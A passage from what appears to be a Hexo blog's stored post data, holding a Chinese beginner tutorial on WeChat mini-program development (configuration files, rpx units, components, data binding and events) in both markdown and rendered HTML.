设置——开发设置\n\n+  开发工具\n   + 下载—扫码登录—选择小程序—创建小程序—预览模板界面\n\n+  [官方文档](https://developers.weixin.qq.com/miniprogram/dev/index.html?t=2018413)\n\n\n\n## 2.结构分析\n\n以下是小程序的基本目录结构，也可以根据需要任意添加其它目录，如资源目录 assets、第三方库vendors、扩展目录 extends等。\n\n```bash\n├── app.js ...................小程序入口文件\n├── app.json .................小程序全局配置\n├── app.wxss .................小程序全局样式\n├── pages ....................所有页面目录\n│   ├── index ................index页面目录\n│   │   ├── index.js .........index页面业务逻辑\n│   │   ├── index.wxml .......index页面布局结构\n│   │   └── index.wxss .......index页面布局样式\n│   └── logs .................logs页目录\n│       ├── logs.js ..........logs页面业务逻辑\n│       ├── logs.json ........logs页面配置文件\n│       ├── logs.wxml ........logs页面布局结构\n│       └── logs.wxss ........logs页面布局样式\n├── project.config.json ......开发工具配置文件\n└── utils ....................公共逻辑\n    └── util.js ..............实用工具\n```\n\n\n\n==主体 app：一个小程序主体部分由三个文件组成，放在项目的根目录（如果项目使用gulp或者webpack打包，则需要在`project.config.js` 指定 `\"miniprogramRoot\": \"路径“` 属性）==\n\n### 2.1全局配置\n\n通过 app.json 文件对小程序进行全局配置，如页面文件的路径、窗口表现、设置网络超时时间、设置多 tab 等。\n\n**app.json 配置清单**\n\n| 属性           | 类型         | 必填 | 描述                 |\n| -------------- | ------------ | ---- | -------------------- |\n| pages          | String Array | 是   | 设置页面路径         |\n| window         | Object       | 否   | 设置默认窗口表现     |\n| tabBar         | Object       | 否   | 设置底部 tab 表现    |\n| networkTimeout | Object       | 否   | 设置网络超时时间     |\n| debug          | Boolean      | 否   | 设置是否开启调试模式 |\n\napp.json 示例\n\n```json\n{\n  \"pages\":[\n    \"pages/index/index\",\n    \"pages/detail/index\"\n  ]\n}\n```\n\n2. **window**\n\n对象类型，用于设置小程序的状态栏、导航条、标题、窗口背景色。\n\n| 属性                         | 类型     | 默认值  | 描述                               | 兼容 |\n| ---------------------------- | -------- | ------- | ---------------------------------- | ---- |\n| navigationBarBackgroundColor | HexColor | #000000 | 导航栏背景颜色，如\"#000000\"        | -    |\n| navigationBarTextStyle       | String   | white   | 导航栏标题颜色，仅支持 black/white |      |\n| navigationBarTitleText       | String   |         | 导航栏标题文字内容                 |      |\n| backgroundColor              | HexColor | #ffffff | 窗口的背景色                       |      |\n\n查看window[更多配置](https://developers.weixin.qq.com/miniprogram/dev/framework/config.html#window)属性\n\n编辑 app.json，添加字段 windows\n\n```json\n{\n  \"window\": {\n     \"navigationBarBackgroundColor\": \"#262626\",\n     \"navigationBarTitleText\": \"XXX\",\n     \"navigationBarTextStyle\": \"white\",\n     \"backgroundColor\": \"#F0F0F0\"\n  }\n}\n```\n\n3. **tabBar**\n\n对象类型，配置项指定 tab 栏的表现，以及 tab 切换时显示的对应页面。\n\n| 属性            | 类型     | 必填 | 默认值 | 描述                                    |\n| --------------- | -------- | ---- | ------ | --------------------------------------- |\n| color           | HexColor | 是   |        | tab 上的文字默认颜色                    |\n| selectedColor   | HexColor | 是   |        | tab 上的文字选中时的颜色                |\n| backgroundColor | HexColor | 是   |        | tab 的背景色                            |\n| borderStyle     | String   | 否   | black  | tabbar上边框的颜色， 仅支持 black/white |\n| list            | Array    | 是   |        | tab 的列表，最少2个、最多5个            |\n| position        | String   | 否   | bottom | 可选值 bottom、top                      |\n\n1. 当设置 position 为 top 时，将不会显示 icon\n2. tabBar 中的 list 是一个数组，**只能配置最少2个、最多5个 tab**，tab 按数组的顺序排序。\n\n其中 list 接受一个数组，数组中的每个项都是一个对象，其属性值如下：\n\n| 属性             | 类型   | 必填 | 描述                                                         |\n| ---------------- | ------ | ---- | ------------------------------------------------------------ |\n| pagePath         | String | 是   | 页面路径，必须在 pages 中先定义                              |\n| text             | String | 是   | tab 上按钮文字                                               |\n| iconPath         | String | 否   | 图片路径，icon 大小限制为40kb，建议尺寸为 81px * 81px，当 postion 为 top 时，此参数无效，不支持网络图片 |\n| selectedIconPath | String | 否   | 选中时的图片路径，icon 大小限制为40kb，建议尺寸为 81px * 81px ，当 postion 为 top 时，此参数无效 |\n\n### 2.2页面配置\n\n> 每个页面可以有不同的表现，通过 pages 目录下的 .json 文件，如 logs.json ，实现页面的局部配置。\n>\n> 但是只能设置 app.json 中的 window 配置项的内容，页面中配置项会覆盖 app.json 的 window 中相同的配置项。\n\n| 属性                         | 类型     | 默认值 | 描述                               |\n| ---------------------------- | -------- | ------ | ---------------------------------- |\n| navigationBarBackgroundColor | HexColor | #000   | 导航栏背景颜色                     |\n| navigationBarTextStyle       | String   | white  | 导航栏标题颜色，仅支持 black/white |\n| navigationBarTitleText       | String   |        | 导航栏标题文字内容                 |\n| backgroundColor              | HexColor | #fff   | 窗口的背景色                       |\n\n```\n// 在 pages/center 目录下创建 index.json\nFC/pages/center\n├── index.js\n├── index.json\n└── index.wxml\n```\n\n如下所示，编辑 index.json\n\n```json\n{\n  \"navigationBarBackgroundColor\": \"#ffffff\",\n  \"navigationBarTextStyle\": \"white\",\n  \"navigationBarTitleText\": \"我的\"\n}\n```\n\n### 2.3适配、样式和组件\n\n**一句话：开发小程序时所有屏幕宽度都是 750rpx。**\n\n**rpx（responsive pixel）可以根据屏幕宽度进行自适应。规定所有屏幕宽为750rpx。**\n\nrpx 与 px 的换算关系：\n\n| 设备           | 屏幕尺寸 | rpx换算px (屏幕宽度/750) | px换算rpx (750/屏幕宽度) |\n| -------------- | -------- | ------------------------ | ------------------------ |\n| iPhone5        | 320px    | 1rpx = 0.42px            | 1px = 2.34rpx            |\n| 小米MIX 2S     | 360px    | 1rpx = 0.48px            | 1px = 2.083rpx           |\n| iPhone6        | 375px    | 1rpx = 0.5px             | 1px = 2rpx               |\n| iPhone6 Plus   | 414px    | 1rpx = 0.552px           | 1px = 1.81rpx            |\n| HUAWEI Mate 10 | 480px    | 1rpx = 0.64px            | 1px = 1.562rpx           |\n\n- 样式导入\n\n  使用 @import 语句可以导入外联样式表， @import 后跟需要导入的外联样式表的相对路径，用 ; 表示语句结束。\n\n   ```css\n  /** common.wxss **/\n  page {\n  \tbackground: #F0F0F0;\n  }\n   ```\n\n  ```css\n  /** index.wxss **/\n  @import \"common.wxss\";\n  page {\n  \tbackground: #F2F2F2;\n  }\n  ```\n\n  \n\n- 内联样式\n\n- 外部样式\n\n**image 相当于 html 中的 img 标签，用来加载图片。**\n\n```html\n<!-- 通过 src 属性加载图片 -->\n<!-- 通过 mode 属性调整 图片的的显示方式 (裁切/缩放) -->\n<!-- image 组件默认宽度为300px，默认高度为225px -->\n<image src=\"../../static/uploads/item_1.png\" mode=\"aspectFit\"></image>\n```\n\n关于 [mode 有效值](https://developers.weixin.qq.com/miniprogram/dev/component/image.html)\n\n**text  相当于 html 中的 span，用来定义文本。**\n\n**view 相当于 html 中的 div，一般做为容器出现。**\n\n**swiper 滑块组件，可以用来实现类似轮播图布局效果。**\n\n## 3.基本语法\n\n####  数据绑定\n\n类似`vue`\n\n```js\n// pages/demo/data.js\nPage({\n    // 通过 data 属性，初始化页面中用到的数据\n    data: {\n        message: 'hello world!'\n        user: {\n            name: '小明',\n            age: 16\n        },\n        courses: ['wxml', 'wxss', 'javascript']\n    }\n});\n```\n\n\n\n```html\n<!-- pages/demo/data.wxml -->\n<text class=\"msg\">{{message}}</text>\n<text>\n  我叫{{user.name}}，\n  我今年{{user.age}}岁了，\n  我在学习{{courses[0]}}课程。\n</text>\n```\n\n#### 列表数据\n\n```js\n// pages/demo/data.js\nPage({\n    // 通过 data 属性，初始化页面中用到的数据\n    data: {\n        brands: [\n            {\n                name: '耐克',\n                origin: '美国',\n                category: ['男装', '女装', '鞋', '体育用品']\n            },\n            {\n                name: 'SK-II',\n                origin: '韩国',\n                category: ['防晒霜','面膜', '洗护']\n            }\n        ]\n    }\n});\n```\n\n\n\n```html\n<!-- pages/demo/data.wxml -->\n<view wx:for=\"{{brands}}\" wx:for-index=\"k\" wx:for-item=\"v\">\n    <view>\n        <text>{{k+1}} </text>\n        <text> {{v.name}} </text>\n        <text> {{v.origin}}</text>\n    </view>\n    <view>\n        <text wx:for=\"{{v.category}}\">{{item}}</text>\n    </view>\n</view>\n```\n\n\n\nwx:for 属性将当前组件按着数组的长度动态创建，并且通过 index 变量可以访问到数组的索引值，通过item变量可以访问到单元值。\n\n#### block\n\n```html\n<!-- pages/demo/data.wxml -->\n<block wx:for=\"{{users}}\">\n    <text>{{item.name}}</text>\n    <text>{{item.age}}</text>\n</block>\n```\n\n\n\n#### 条件数据\n\n```html\n<view wx:for=\"{{users}}\">\n    <text>{{index+1}} </text>\n    <text> {{item.name}}</text>\n    <text> {{item.age}} </text>\n    <text wx:if=\"{{item.age <= 14}}\"> 儿童</text>\n    <text wx:elif=\"{{item.age <= 18}}\"> 未成年</text>\n    <text wx:else> 成年人</text>\n</view>\n```\n\n\n\n```js\nPage({\n    data: {\n        users: [\n            {name: '小明', age: 18},\n            {name: '小红', age: 13},\n            {name: '小丽', age: 19}\n        ]\n    }\n});\n```\n\n#### 事件触发\n\n**语法格式： bind:事件名称=\"回调函数\"**\n\n```html\n<button type=\"primary\" bind:tap=\"sayHi\">点我试试</button>\n<input type=\"text\" bind:focus=\"sayHi\" bind:blur=\"sayBye\" />\n```\n\n\n\n```js\n// pages/demo/data.js\nPage({\n    sayHi: function () {\n        console.log('Hi~')\n    },\n    sayHi: function () {\n        console.log('Hi~');\n    },\n    sayBye: function (ev) { // ev  时间对象\n      \tconsole.log(ev);\n        console.log('Bye~');\n    }\n});\n```\n\n\n\n#### 事件冒泡\n\n+ 子元素用bindtap绑定事件后，执行的时候，会冒泡到父元素（触发父亲元素上绑定的bindtap事件）\n\n+ 如果不想冒泡到父元素，可以用catchtap代替\n\n```html\n<botton catchtap=\"goDetail\">catchtap</botton>\n<botton bindtap=\"goDetail\">bindtap</botton>\n```\n\n## 4.生命周期\n\n<img src=\"WXMiniProgram/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.png\" alt=\"微信小程序的生命周期\" style=\"zoom:67%;\" />\n\n","slug":"WXMiniProgram","published":1,"updated":"2020-06-22T10:05:03.051Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckclr4u2k0004qrwt93x2s3ao","content":"<h2 id=\"1-开发准备\"><a href=\"#1-开发准备\" class=\"headerlink\" title=\"1.开发准备\"></a>1.开发准备</h2><ul>\n<li><p><a href=\"https://mp.weixin.qq.com/cgi-bin/registermidpage?action=index&amp;lang=zh_CN\" target=\"_blank\" rel=\"noopener\">账号申请</a></p>\n<ul>\n<li>选择注册账号类型 —— 小程序</li>\n<li>账号信息</li>\n<li>邮箱激活</li>\n<li>信息登记</li>\n</ul>\n</li>\n<li><p>绑定开发者</p>\n<ul>\n<li><a href=\"https://mp.weixin.qq.com/\" target=\"_blank\" rel=\"noopener\">登录小程序</a></li>\n<li>管理员授权</li>\n<li>添加成员</li>\n</ul>\n</li>\n<li><p>获取AppID</p>\n<ul>\n<li>设置——开发设置</li>\n</ul>\n</li>\n<li><p>开发工具</p>\n<ul>\n<li>下载—扫码登录—选择小程序—创建小程序—预览模板界面</li>\n</ul>\n</li>\n<li><p><a href=\"https://developers.weixin.qq.com/miniprogram/dev/index.html?t=2018413\" target=\"_blank\" rel=\"noopener\">官方文档</a></p>\n</li>\n</ul>\n<h2 id=\"2-结构分析\"><a href=\"#2-结构分析\" class=\"headerlink\" title=\"2.结构分析\"></a>2.结构分析</h2><p>以下是小程序的基本目录结构，也可以根据需要任意添加其它目录，如资源目录 assets、第三方库vendors、扩展目录 extends等。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">├── app.js ...................小程序入口文件</span><br><span class=\"line\">├── app.json .................小程序全局配置</span><br><span class=\"line\">├── app.wxss .................小程序全局样式</span><br><span class=\"line\">├── pages ....................所有页面目录</span><br><span class=\"line\">│   ├── index ................index页面目录</span><br><span class=\"line\">│   │   ├── index.js .........index页面业务逻辑</span><br><span class=\"line\">│   │   ├── index.wxml .......index页面布局结构</span><br><span class=\"line\">│   │   └── index.wxss .......index页面布局样式</span><br><span class=\"line\">│   └── logs .................logs页目录</span><br><span class=\"line\">│       ├── logs.js ..........logs页面业务逻辑</span><br><span class=\"line\">│       ├── logs.json ........logs页面配置文件</span><br><span class=\"line\">│       ├── logs.wxml ........logs页面布局结构</span><br><span class=\"line\">│       └── logs.wxss ........logs页面布局样式</span><br><span class=\"line\">├── project.config.json ......开发工具配置文件</span><br><span class=\"line\">└── utils ....................公共逻辑</span><br><span class=\"line\">    └── util.js ..............实用工具</span><br></pre></td></tr></table></figure>\n<p>==主体 app：一个小程序主体部分由三个文件组成，放在项目的根目录（如果项目使用gulp或者webpack打包，则需要在<code>project.config.js</code> 指定 <code>&quot;miniprogramRoot&quot;: &quot;路径“</code> 属性）==</p>\n<h3 id=\"2-1全局配置\"><a href=\"#2-1全局配置\" class=\"headerlink\" title=\"2.1全局配置\"></a>2.1全局配置</h3><p>通过 app.json 文件对小程序进行全局配置，如页面文件的路径、窗口表现、设置网络超时时间、设置多 tab 等。</p>\n<p><strong>app.json 配置清单</strong></p>\n<table>\n<thead>\n<tr>\n<th>属性</th>\n<th>类型</th>\n<th>必填</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>pages</td>\n<td>String Array</td>\n<td>是</td>\n<td>设置页面路径</td>\n</tr>\n<tr>\n<td>window</td>\n<td>Object</td>\n<td>否</td>\n<td>设置默认窗口表现</td>\n</tr>\n<tr>\n<td>tabBar</td>\n<td>Object</td>\n<td>否</td>\n<td>设置底部 tab 表现</td>\n</tr>\n<tr>\n<td>networkTimeout</td>\n<td>Object</td>\n<td>否</td>\n<td>设置网络超时时间</td>\n</tr>\n<tr>\n<td>debug</td>\n<td>Boolean</td>\n<td>否</td>\n<td>设置是否开启调试模式</td>\n</tr>\n</tbody>\n</table>\n<p>app.json 示例</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">\"pages\"</span>:[</span><br><span class=\"line\">    <span class=\"string\">\"pages/index/index\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"pages/detail/index\"</span></span><br><span class=\"line\">  ]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ol start=\"2\">\n<li><strong>window</strong></li>\n</ol>\n<p>对象类型，用于设置小程序的状态栏、导航条、标题、窗口背景色。</p>\n<table>\n<thead>\n<tr>\n<th>属性</th>\n<th>类型</th>\n<th>默认值</th>\n<th>描述</th>\n<th>兼容</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>navigationBarBackgroundColor</td>\n<td>HexColor</td>\n<td>#000000</td>\n<td>导航栏背景颜色，如”#000000”</td>\n<td>-</td>\n</tr>\n<tr>\n<td>navigationBarTextStyle</td>\n<td>String</td>\n<td>white</td>\n<td>导航栏标题颜色，仅支持 black/white</td>\n<td></td>\n</tr>\n<tr>\n<td>navigationBarTitleText</td>\n<td>String</td>\n<td></td>\n<td>导航栏标题文字内容</td>\n<td></td>\n</tr>\n<tr>\n<td>backgroundColor</td>\n<td>HexColor</td>\n<td>#ffffff</td>\n<td>窗口的背景色</td>\n</tr>\n</tbody>\n</table>\n<p>查看window<a href=\"https://developers.weixin.qq.com/miniprogram/dev/framework/config.html#window\" target=\"_blank\" rel=\"noopener\">更多配置</a>属性</p>\n<p>编辑 app.json，添加字段 windows</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">\"window\"</span>: &#123;</span><br><span class=\"line\">     <span class=\"attr\">\"navigationBarBackgroundColor\"</span>: <span class=\"string\">\"#262626\"</span>,</span><br><span class=\"line\">     <span class=\"attr\">\"navigationBarTitleText\"</span>: <span class=\"string\">\"XXX\"</span>,</span><br><span class=\"line\">     <span class=\"attr\">\"navigationBarTextStyle\"</span>: <span class=\"string\">\"white\"</span>,</span><br><span class=\"line\">     <span class=\"attr\">\"backgroundColor\"</span>: <span class=\"string\">\"#F0F0F0\"</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li><strong>tabBar</strong></li>\n</ol>\n<p>对象类型，配置项指定 tab 栏的表现，以及 tab 切换时显示的对应页面。</p>\n<table>\n<thead>\n<tr>\n<th>属性</th>\n<th>类型</th>\n<th>必填</th>\n<th>默认值</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>color</td>\n<td>HexColor</td>\n<td>是</td>\n<td></td>\n<td>tab 上的文字默认颜色</td>\n</tr>\n<tr>\n<td>selectedColor</td>\n<td>HexColor</td>\n<td>是</td>\n<td></td>\n<td>tab 上的文字选中时的颜色</td>\n</tr>\n<tr>\n<td>backgroundColor</td>\n<td>HexColor</td>\n<td>是</td>\n<td></td>\n<td>tab 的背景色</td>\n</tr>\n<tr>\n<td>borderStyle</td>\n<td>String</td>\n<td>否</td>\n<td>black</td>\n<td>tabbar上边框的颜色， 仅支持 black/white</td>\n</tr>\n<tr>\n<td>list</td>\n<td>Array</td>\n<td>是</td>\n<td></td>\n<td>tab 的列表，最少2个、最多5个</td>\n</tr>\n<tr>\n<td>position</td>\n<td>String</td>\n<td>否</td>\n<td>bottom</td>\n<td>可选值 bottom、top</td>\n</tr>\n</tbody>\n</table>\n<ol>\n<li>当设置 position 为 top 时，将不会显示 icon</li>\n<li>tabBar 中的 list 是一个数组，<strong>只能配置最少2个、最多5个 tab</strong>，tab 按数组的顺序排序。</li>\n</ol>\n<p>其中 list 接受一个数组，数组中的每个项都是一个对象，其属性值如下：</p>\n<table>\n<thead>\n<tr>\n<th>属性</th>\n<th>类型</th>\n<th>必填</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>pagePath</td>\n<td>String</td>\n<td>是</td>\n<td>页面路径，必须在 pages 中先定义</td>\n</tr>\n<tr>\n<td>text</td>\n<td>String</td>\n<td>是</td>\n<td>tab 上按钮文字</td>\n</tr>\n<tr>\n<td>iconPath</td>\n<td>String</td>\n<td>否</td>\n<td>图片路径，icon 大小限制为40kb，建议尺寸为 81px * 81px，当 postion 为 top 时，此参数无效，不支持网络图片</td>\n</tr>\n<tr>\n<td>selectedIconPath</td>\n<td>String</td>\n<td>否</td>\n<td>选中时的图片路径，icon 大小限制为40kb，建议尺寸为 81px * 81px ，当 postion 为 top 时，此参数无效</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"2-2页面配置\"><a href=\"#2-2页面配置\" class=\"headerlink\" title=\"2.2页面配置\"></a>2.2页面配置</h3><blockquote>\n<p>每个页面可以有不同的表现，通过 pages 目录下的 .json 文件，如 logs.json ，实现页面的局部配置。</p>\n<p>但是只能设置 app.json 中的 window 配置项的内容，页面中配置项会覆盖 app.json 的 window 中相同的配置项。</p>\n</blockquote>\n<table>\n<thead>\n<tr>\n<th>属性</th>\n<th>类型</th>\n<th>默认值</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>navigationBarBackgroundColor</td>\n<td>HexColor</td>\n<td>#000</td>\n<td>导航栏背景颜色</td>\n</tr>\n<tr>\n<td>navigationBarTextStyle</td>\n<td>String</td>\n<td>white</td>\n<td>导航栏标题颜色，仅支持 black/white</td>\n</tr>\n<tr>\n<td>navigationBarTitleText</td>\n<td>String</td>\n<td></td>\n<td>导航栏标题文字内容</td>\n</tr>\n<tr>\n<td>backgroundColor</td>\n<td>HexColor</td>\n<td>#fff</td>\n<td>窗口的背景色</td>\n</tr>\n</tbody>\n</table>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 在 pages/center 目录下创建 index.json</span><br><span class=\"line\">FC/pages/center</span><br><span class=\"line\">├── index.js</span><br><span class=\"line\">├── index.json</span><br><span class=\"line\">└── index.wxml</span><br></pre></td></tr></table></figure>\n<p>如下所示，编辑 index.json</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">\"navigationBarBackgroundColor\"</span>: <span class=\"string\">\"#ffffff\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"navigationBarTextStyle\"</span>: <span class=\"string\">\"white\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"navigationBarTitleText\"</span>: <span class=\"string\">\"我的\"</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"2-3适配、样式和组件\"><a href=\"#2-3适配、样式和组件\" class=\"headerlink\" title=\"2.3适配、样式和组件\"></a>2.3适配、样式和组件</h3><p><strong>一句话：开发小程序时所有屏幕宽度都是 750rpx。</strong></p>\n<p><strong>rpx（responsive pixel）可以根据屏幕宽度进行自适应。规定所有屏幕宽为750rpx。</strong></p>\n<p>rpx 与 px 的换算关系：</p>\n<table>\n<thead>\n<tr>\n<th>设备</th>\n<th>屏幕尺寸</th>\n<th>rpx换算px (屏幕宽度/750)</th>\n<th>px换算rpx (750/屏幕宽度)</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>iPhone5</td>\n<td>320px</td>\n<td>1rpx = 0.42px</td>\n<td>1px = 2.34rpx</td>\n</tr>\n<tr>\n<td>小米MIX 2S</td>\n<td>360px</td>\n<td>1rpx = 0.48px</td>\n<td>1px = 2.083rpx</td>\n</tr>\n<tr>\n<td>iPhone6</td>\n<td>375px</td>\n<td>1rpx = 0.5px</td>\n<td>1px = 2rpx</td>\n</tr>\n<tr>\n<td>iPhone6 Plus</td>\n<td>414px</td>\n<td>1rpx = 0.552px</td>\n<td>1px = 1.81rpx</td>\n</tr>\n<tr>\n<td>HUAWEI Mate 10</td>\n<td>480px</td>\n<td>1rpx = 0.64px</td>\n<td>1px = 1.562rpx</td>\n</tr>\n</tbody>\n</table>\n<ul>\n<li><p>样式导入</p>\n<p>使用 @import 语句可以导入外联样式表， @import 后跟需要导入的外联样式表的相对路径，用 ; 表示语句结束。</p>\n <figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/** common.wxss **/</span></span><br><span class=\"line\"><span class=\"selector-tag\">page</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">background</span>: <span class=\"number\">#F0F0F0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/** index.wxss **/</span></span><br><span class=\"line\">@<span class=\"keyword\">import</span> <span class=\"string\">\"common.wxss\"</span>;</span><br><span class=\"line\"><span class=\"selector-tag\">page</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">background</span>: <span class=\"number\">#F2F2F2</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<ul>\n<li><p>内联样式</p>\n</li>\n<li><p>外部样式</p>\n</li>\n</ul>\n<p><strong>image 相当于 html 中的 img 标签，用来加载图片。</strong></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- 通过 src 属性加载图片 --&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- 通过 mode 属性调整 图片的的显示方式 (裁切/缩放) --&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- image 组件默认宽度为300px，默认高度为225px --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">image</span> <span class=\"attr\">src</span>=<span class=\"string\">\"../../static/uploads/item_1.png\"</span> <span class=\"attr\">mode</span>=<span class=\"string\">\"aspectFit\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">image</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>关于 <a href=\"https://developers.weixin.qq.com/miniprogram/dev/component/image.html\" target=\"_blank\" rel=\"noopener\">mode 有效值</a></p>\n<p><strong>text  相当于 html 中的 span，用来定义文本。</strong></p>\n<p><strong>view 相当于 html 中的 div，一般做为容器出现。</strong></p>\n<p><strong>swiper 滑块组件，可以用来实现类似轮播图布局效果。</strong></p>\n<h2 id=\"3-基本语法\"><a href=\"#3-基本语法\" class=\"headerlink\" title=\"3.基本语法\"></a>3.基本语法</h2><h4 id=\"数据绑定\"><a href=\"#数据绑定\" class=\"headerlink\" title=\"数据绑定\"></a>数据绑定</h4><p>类似<code>vue</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// pages/demo/data.js</span></span><br><span class=\"line\">Page(&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 通过 data 属性，初始化页面中用到的数据</span></span><br><span class=\"line\">    data: &#123;</span><br><span class=\"line\">        message: <span class=\"string\">'hello world!'</span></span><br><span class=\"line\">        user: &#123;</span><br><span class=\"line\">            name: <span class=\"string\">'小明'</span>,</span><br><span class=\"line\">            age: <span class=\"number\">16</span></span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        courses: [<span class=\"string\">'wxml'</span>, <span class=\"string\">'wxss'</span>, <span class=\"string\">'javascript'</span>]</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- pages/demo/data.wxml --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">text</span> <span class=\"attr\">class</span>=<span class=\"string\">\"msg\"</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">text</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">text</span>&gt;</span></span><br><span class=\"line\">  我叫&#123;&#123;user.name&#125;&#125;，</span><br><span class=\"line\">  我今年&#123;&#123;user.age&#125;&#125;岁了，</span><br><span class=\"line\">  我在学习&#123;&#123;courses[0]&#125;&#125;课程。</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">text</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"列表数据\"><a href=\"#列表数据\" class=\"headerlink\" title=\"列表数据\"></a>列表数据</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// pages/demo/data.js</span></span><br><span class=\"line\">Page(&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 通过 data 属性，初始化页面中用到的数据</span></span><br><span class=\"line\">    data: &#123;</span><br><span class=\"line\">        brands: [</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                